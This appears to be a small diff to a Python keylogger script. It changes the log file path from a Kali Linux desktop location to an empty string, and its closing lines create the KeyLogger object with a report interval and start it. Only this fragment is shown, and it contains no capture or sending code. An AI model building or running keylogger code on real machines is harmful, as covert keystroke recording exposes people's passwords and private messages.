@@ -43,7 +43,7 @@ class KeyLogger:
             keyboard_listener.join()
 
 # Set the path to save the log file directly on your Kali Linux desktop
-output_file = "/home/kali/Desktop/keylog.txt"
+output_file = ""
 
 keylogger = KeyLogger(SEND_REPORT_EVERY, output_file)
 keylogger.run()
